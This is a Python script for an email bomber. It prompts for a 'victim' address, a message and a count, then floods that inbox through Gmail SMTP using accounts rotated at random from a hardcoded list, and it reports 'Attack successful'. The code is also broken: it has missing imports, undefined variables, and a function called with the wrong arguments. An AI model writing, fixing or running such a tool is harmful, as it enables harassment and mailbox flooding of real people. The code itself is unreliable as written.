# Built-in modules
from smtplib import SMTP
from sys import exit
from random import choice

# Third-party packages
from termcolor import colored as cl
from pyfiglet import figlet_format as ff

# Local modules
from email_account import EmailAccount
from email_accounts import ACCOUNTS


def get_rand_account() -> EmailAccount:
    """
    Return a randomly selected e-mail account from the
    hardcoded accounts in email_accounts.py.
    """
    return choice(ACCOUNTS)

def send_mail(account: EmailAccount, message: str) -> None:
    obj = smtplib.SMTP('smtp.gmail.com', 587)
    obj.starttls()
    try:
        obj.login(ma, pa)
    except:
        print(cl('Unexpected error from our side, sorry for the inconvenience', 'red'))
    obj.sendmail(ma, acc, msg)
    obj.quit()
    print(cl(f'Mail {str(i+1)} sent successfully ☑', 'green'))


try:
    mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
except:
    print(cl('The input must be an integer', 'red'))
    sys.exit()
victim = input(cl('Enter the mail address of victim:', 'red').strip())
message = input(cl('Enter the message to be sent in email:', 'red').strip())
send_mail(victim, mails_to_be_sent, message, ma, password)
print(cl('-'*10+'\nAttack successful', 'green'))
os.system('clear')	
    
while True:
    if input(cl('Quit(y/n)? ', 'red')).lower().strip() == 'n':
        try:
            mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
        except:
            print(cl('The input be an integer', 'red'))
            sys.exit()
        victim = input(cl('Enter the mail address of victim:', 'red').strip())
        message = input(cl('Enter the message to be sent in email:', 'red').strip())
        send_mail(victim, mails_to_be_sent, message, ma, password)
        print(cl('-'*10+'\nAttack successful', 'green'))
        os.system('cls')
    else:
        sys.exit()
